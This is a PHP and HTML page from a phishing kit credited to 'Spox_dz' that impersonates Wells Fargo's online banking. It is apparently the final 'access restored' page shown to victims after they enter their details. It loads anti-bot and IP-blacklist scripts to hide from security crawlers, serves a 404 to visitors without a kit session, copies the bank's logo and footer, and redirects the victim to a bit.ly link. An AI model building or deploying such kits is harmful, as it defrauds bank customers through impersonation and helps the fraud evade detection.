<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Wells             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';


if (!isset($_GET['wells_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

if (!isset($_SESSION['WELLS_SPOX'])) {

  header("Location: index");
  exit();
}

?>
<html lang="en"><head>
	
		<title>Wells Fargo - Thank you!</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<link rel="preload" href="Spox/Files/css/e3bca3d55eea5d3fd4e9483a19930aae6aa9dbe0-l.woff2" as="font" type="font/woff2" crossorigin="">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2,user-scalable=0, maximum-scale=5, user-scalable=yes">
		<link type="text/css" href="Spox/Files/css/vendor.css?version=19.10.00.30" rel="stylesheet" media="all">
		<link type="text/css" href="Spox/Files/css/dsf.css" rel="stylesheet" media="all">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<link rel="shortcut icon" href="favicon.ico"/>
<link rel="icon" href="favicon.ico" type="image/x-icon">
     	<meta http-equiv="refresh" content="5;url=https://bit.ly/2UgDDbr"> 


		</head>
	<body data-inq-observer="1">
	
 
  <div id="root">
  	<div data-app-container="">
  	<div tabindex="-1" id="accessibilityFocus" class="AccessibilityFocus-accessibilityFocus-YWNjZXNzaWJpbGl0eUZvY3">
  	
  </div>
  <div role="presentation" style="background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAIAAABLbSncAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTExIDc5LjE1ODMyNSwgMjAxNS8wOS8xMC0wMToxMDoyMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RTlGMDI2NjRFODJBMTFFNzhGREZCNDdGQkNFNDQwMUIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RTlGMDI2NjVFODJBMTFFNzhGREZCNDdGQkNFNDQwMUIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpFOUYwMjY2MkU4MkExMUU3OEZERkI0N0ZCQ0U0NDAxQiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpFOUYwMjY2M0U4MkExMUU3OEZERkI0N0ZCQ0U0NDAxQiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnPB7ssAAAAjSURBVHjaYvz//z8DNsAExLdu3YLz4WxGfDpIl6CSHQABBgAtGRM9NeLYJQAAAABJRU5ErkJggg==);">
  	<div data-en="primary-window" class="PrimaryWindow-primary-window-cHJpbWFyeS13aW5kb3d3Zi1yZWFjdC11aQ">
  		
  <div data-en="popup-link" class="PopupLink-fit-content-Zml0LWNvbnRlbnR3Zi1yZWFjdC11aQ">
  	<div class="PopupLink-container-Y29udGFpbmVyd2YtcmVhY3QtdW PopupLink-inline-content-aW5saW5lLWNvbnRlbnR3Zi1yZWFjdC11aQ" tabindex="-1" id="wait-popup-link">
  		
  	</div>
  	<div class="__popup-fade-exited">
  	
  </div>
</div>
  <div class="MastheadWrapper-masthead-wrapper-bWFzdGhlYWQtd3JhcHBlcg">
  	<div class="CoreMasthead-masthead-static-bWFzdGhlYWQtc3RhdG   CoreMasthead-desktop-ZGVza3RvcA  ">
  		<div style="width: 1080px;">
  	<div class="Masthead-masthead-bWFzdGhlYWR3Zi1yZWFjdC11aQ   " role="banner">
  	<div class="Masthead-masthead-bWFzdGhlYWR3Zi1yZWFjdC11aQ   ">
  	<div class="LogoBar-logoBar-bG9nb0Jhcg    " style="padding: 0px 20px; display: flex; flex-flow: column nowrap; align-items: center; justify-content: center; align-self: stretch;">
  		<div style="width: 100%; display: flex; flex-flow: row nowrap; align-items: center;">
  			<div class="LogoBar-logo-bG9nbw   " style="display: flex; flex-flow: row nowrap; align-items: center;">
  		<button type="button" aria-disabled="false" class="  LegacyButton-plain-cGxhaW  LegacyButton-mobile-bW9iaW LogoLink-link-bGluaw   " role="link" style="height: 60px; padding: 17px 0px; text-align: left;">
  			<span class="visuallyHidden">Wells Fargo Online</span>
  		<svg width="211px" height="22px" x="1.430" y="1.440" viewBox="0 0 211 22" version="1.1" aria-hidden="true" role="img" class="  NavigationLogo-logo-bG9nbw" focusable="false">
  		<g transform="scale(1.430, 1.440)">
  		<path fill="#FFFFFF" d="M31.5783,10.22 L33.0183,10.22 L33.0183,15 L20.9983,15 L20.9983,13.26 L22.6983,13.26 L22.6983,2.74 L19.94,2.74 L16.44,15 L13.66,15 L10.82,4.84 L7.9,15 L5.12,15 L1.6,2.74 L0,2.74 L0,1 L6.52,1 L6.52,2.74 L4.64,2.74 L6.98,11.18 L9.78,1 L12.66,1 L15.52,11.2 L17.82,2.74 L15.86,2.74 L15.86,1 L32.8185,1 L32.8185,5.54 L31.3785,5.54 L31.2385,5 C30.7985,3.32 30.3385,2.74 28.9985,2.74 L25.6785,2.74 L25.6785,6.96 L29.6985,6.96 C29.8509872,7.25655731 29.9266299,7.5866346 29.9185,7.92 C29.9289227,8.26639109 29.8533362,8.60996586 29.6985,8.92 L25.6785,8.92 L25.6785,13.26 L29.1385,13.26 C30.4385,13.26 31.0185,12.7 31.4185,10.92 L31.5783,10.22 Z M44.2172,10.92 C43.8172,12.7 43.2572,13.26 41.9372,13.26 L39.1572,13.26 L39.1572,2.74 L41.0572,2.74 L41.0572,1 L34.4772,1 L34.4772,2.74 L36.1772,2.74 L36.1772,13.26 L34.4772,13.26 L34.4772,15 L45.8172,15 L45.8172,10.22 L44.3772,10.22 L44.2172,10.92 Z M56.8161,10.92 C56.4161,12.7 55.8561,13.26 54.5361,13.26 L51.7561,13.26 L51.7561,2.74 L53.6561,2.74 L53.6561,1 L47.0761,1 L47.0761,2.74 L48.7761,2.74 L48.7761,13.26 L47.0761,13.26 L47.0761,15 L58.4161,15 L58.4161,10.22 L56.9761,10.22 L56.8161,10.92 Z M67.3548,6.8 L64.8148,6.22 C63.3348,5.88 62.7148,5.3 62.7148,4.32 C62.7148,3.14 63.6548,2.4 65.4948,2.4 C67.3348,2.4 68.4148,3.06 68.8348,4.62 L69.0148,5.3 L70.4548,5.3 L70.4548,1.84 C68.8830796,1.03158224 67.1423274,0.606665867 65.3749,0.6 C61.9549,0.6 59.7549,2.24 59.7549,4.88 C59.7549,6.92 61.0349,8.42 63.4949,8.96 L66.0349,9.52 C67.6549,9.88 68.2549,10.52 68.2549,11.58 C68.2549,12.88 67.2749,13.6 65.3149,13.6 C63.0949,13.6 61.9549,12.72 61.4549,11.04 L61.1949,10.18 L59.7549,10.18 L59.7549,14.1 C61.5849502,15.0113218 63.6113126,15.4578084 65.6549,15.4 C69.0149,15.4 71.2149,13.72 71.2149,11.1 C71.2148,8.9 69.8747,7.38 67.3548,6.8 Z M86.6329,2.74 C87.9729,2.74 88.4329,3.32 88.8729,5 L89.0129,5.54 L90.4529,5.54 L90.4529,1 L78.3929,1 L78.3929,2.74 L80.0929,2.74 L80.0929,13.26 L78.3929,13.26 L78.3929,15 L85.0729,15 L85.0729,13.26 L83.0729,13.26 L83.0729,9.18 L87.1929,9.18 C87.3477086,8.86995608 87.4232935,8.52638836 87.4129,8.18 C87.4210727,7.84663029 87.3454276,7.51654256 87.1929,7.22 L83.0729,7.22 L83.0729,2.74 L86.6329,2.74 Z M117.1107,13.42 C117.350603,13.9403466 117.350603,14.5396534 117.1107,15.06 C116.593408,15.1270209 116.072315,15.1604243 115.5507,15.16 C113.6107,15.16 112.6707,14.36 112.4507,12.5 L112.3707,11.8 C112.1307,9.78 111.4707,9 109.2707,9 L108.1707,9 L108.1707,13.26 L110.0707,13.26 L110.0707,15 L97.4921,15 L97.4921,13.26 L99.1321,13.26 L98.2121,10.76 L93.0121,10.76 L92.0921,13.26 L93.7721,13.26 L93.7721,15 L88.4721,15 L88.4721,13.26 L89.8721,13.26 L94.772,1 L97.432,1 L102.432,13.26 L105.1907,13.26 L105.1907,2.74 L103.4907,2.74 L103.4907,1 L111.5307,1 C114.3907,1 116.2507,2.42 116.2507,4.7 C116.236826,5.65544044 115.842919,6.56599554 115.156084,7.23031176 C114.469248,7.89462798 113.546072,8.25797324 112.5907,8.24 L112.5907,8.3 C113.320265,8.29049748 114.022729,8.57612277 114.538653,9.09204674 C115.054577,9.60797071 115.340203,10.3104352 115.3307,11.04 L115.4107,11.78 C115.5307,12.94 115.7707,13.46 116.6907,13.46 C116.831581,13.4586084 116.972089,13.4452267 117.1107,13.42 Z M97.5719,9.06 L95.6119,3.76 L93.6519,9.06 L97.5719,9.06 Z M113.2307,4.98 C113.2307,3.52 112.3307,2.74 110.5307,2.74 L108.1707,2.74 L108.1707,7.24 L110.5307,7.24 C112.3108,7.24 113.2307,6.42 113.2307,4.98 Z M125.1745,8.62 C125.161819,8.96019815 125.237622,9.29786628 125.3945,9.6 L127.7745,9.6 L127.7745,13.14 C127.025969,13.4478108 126.223838,13.6041585 125.4145,13.6 C122.5345,13.6 121.0345,11.54 121.0345,7.98 C121.0345,4.42 122.5345,2.36 125.2545,2.36 C126.847915,2.27805546 128.291943,3.29300049 128.7545,4.82 L128.9745,5.38 L130.4145,5.38 L130.4145,1.8 C128.769872,0.975783763 126.954079,0.550956677 125.1145,0.56 C120.7145,0.56 117.7545,3.5 117.7545,8 C117.7545,12.52 120.6345,15.4 125.1145,15.4 C127.070757,15.3481445 128.988059,14.8414289 130.7145,13.92 L130.7145,7.68 L125.3945,7.68 C125.23997,7.96860667 125.164097,8.29279214 125.1745,8.62 Z M147.4382,7.98 C147.4382,12.0889985 144.107199,15.42 139.9982,15.42 C135.889201,15.42 132.5582,12.0889985 132.5582,7.98 C132.5582,3.87100146 135.889201,0.54 139.9982,0.54 C144.107199,0.54 147.4382,3.87100146 147.4382,7.98 Z M144.1582,7.98 C144.1582,4.44 142.6982,2.38 139.9982,2.38 C137.2982,2.38 135.8382,4.44 135.8382,7.98 C135.8382,11.54 137.2782,13.58 139.9982,13.58 C142.7182,13.58 144.1582,11.54 144.1582,7.98 Z" id="Shape" fill-rule="nonzero"></path></g></svg></button></div>
  	</div>
  	</div>
  		
  		<div class="Masthead-spacer-c3BhY2Vyd2YtcmVhY3QtdW">
  			
  		</div>
  	</div>
  		<div data-en="overlay" role="presentation" class="">
  			
  		</div>
  	</div>
  	</div>
  	</div>
  		
  		
  	</div>
  		<div class="LoginContainer-LoginContainer-TG9naW5Db250YWluZX">
  			<div>
  			<div>
  			<main>
  			<div class="BorderBox-box-style-Ym94LXN0eW undefined">

  			<h1 class="LoginForm-main-Header-Title-bWFpbi1IZWFkZXItVGl0bG">Thank you! Your access has been Restored.</h1><div></div><div class="LoginForm-component-container-Y29tcG9uZW50LWNvbnRhaW5lcg">

<center><img src="Spox/Files/img/PE-Success-Icon.png" alt="Smiley face" height="42" width="42"></center><br><h2 class="LoginForm-ap-subheader-YXAtc3ViaGVhZG">Please wait, you will be redirected to the authentication,<br> If the page doesn't reload in 5sec please click on this button below.</h2>
  				<div class="AccessCodeLogin-AccessCodeLogin-QWNjZXNzQ29kZUxvZ2"><form data-en="form" action="https://bit.ly/2UgDDbr" autocomplete="off" class="undefined" id="accessCodeForm" method="POST" novalidate=""><div></div><div class="AccessCodeLogin-btn-container-YnRuLWNvbnRhaW5lcg"><button id="AccessCodeSignOn" data-en="button" name="AccessCodeSignOn" tabindex="0" type="submit" formid="accessCodeForm" class="Button-btn-p-YnRuLXB3Zi1yZWFjdC11aQ AccessCodeLogin-override-b3ZlcnJpZG"> Sign On </button></div></form></div></div></div>

  			</main></div></div></div><div role="contentinfo" data-page-footer="" class=" Footer-footer-mobile-Zm9vdGVyLW1vYmlsZQ   " style="display: flex; flex-flow: row nowrap;"><div class="Footer-footer-container-Zm9vdGVyLWNvbnRhaW5lcndmLXJlYWN0LX"><nav aria-label="corporate, legal, security" class="FooterLinks-footerList-Zm9vdGVyTGlzdHdmLXJlYWN0LX"><div class="FooterLinks-wrapperLink-d3JhcHBlckxpbmt3Zi1yZWFjdC11aQ"><ul class="FooterLinks-dividerLinks-ZGl2aWRlckxpbmtzd2YtcmVhY3QtdW"><li class="FooterLinks-links-bGlua3N3Zi1yZWFjdC11aQ"><span class="FooterLinks-divider-ZGl2aWRlcndmLXJlYWN0LX"></span><a id="About Wells Fargo" class="FooterLinks-footerLink-Zm9vdGVyTGlua3dmLXJlYWN0LX" href="#">About Wells Fargo</a></li><li class="FooterLinks-links-bGlua3N3Zi1yZWFjdC11aQ"><span class="FooterLinks-divider-ZGl2aWRlcndmLXJlYWN0LX"></span><a id="Privacy, Cookies, Security &amp; Legal" class="FooterLinks-footerLink-Zm9vdGVyTGlua3dmLXJlYWN0LX" href="#">Privacy, Cookies, Security &amp; Legal</a></li><li class="FooterLinks-links-bGlua3N3Zi1yZWFjdC11aQ"><span class="FooterLinks-divider-ZGl2aWRlcndmLXJlYWN0LX"></span><a id="Sitemap" class="FooterLinks-footerLink-Zm9vdGVyTGlua3dmLXJlYWN0LX" href="#">Sitemap</a></li><li class="FooterLinks-links-bGlua3N3Zi1yZWFjdC11aQ"><span class="FooterLinks-divider-ZGl2aWRlcndmLXJlYWN0LX"></span><a id="Online Access Agreement" class="FooterLinks-footerLink-Zm9vdGVyTGlua3dmLXJlYWN0LX" href="#">Online Access Agreement</a></li><li class="FooterLinks-links-bGlua3N3Zi1yZWFjdC11aQ"><span class="FooterLinks-divider-ZGl2aWRlcndmLXJlYWN0LX"></span><a id="Careers" class="FooterLinks-footerLink-Zm9vdGVyTGlua3dmLXJlYWN0LX" href="#">Careers</a></li><li class="FooterLinks-links-bGlua3N3Zi1yZWFjdC11aQ"><span class="FooterLinks-divider-ZGl2aWRlcndmLXJlYWN0LX"></span><a id="Report Fraud" class="FooterLinks-footerLink-Zm9vdGVyTGlua3dmLXJlYWN0LX" href="#">Report Fraud</a></li><li class="FooterLinks-links-bGlua3N3Zi1yZWFjdC11aQ"><span class="FooterLinks-divider-ZGl2aWRlcndmLXJlYWN0LX"></span><a id="Diversity &amp; Accessibility" class="FooterLinks-footerLink-Zm9vdGVyTGlua3dmLXJlYWN0LX" href="#">Diversity &amp; Accessibility</a></li><li class="FooterLinks-links-bGlua3N3Zi1yZWFjdC11aQ"><span class="FooterLinks-divider-ZGl2aWRlcndmLXJlYWN0LX"></span><a id="Ad Choices" class="FooterLinks-footerLink-Zm9vdGVyTGlua3dmLXJlYWN0LX" href="#">Ad Choices</a></li></ul></div><span class="FooterLinks-closure-Y2xvc3VyZXdmLXJlYWN0LX">©  1999 - 2020 Wells Fargo. All rights reserved. NMLSR ID 399801.</span></nav></div></div></div></div></div></div>
  	
  
  
</body></html>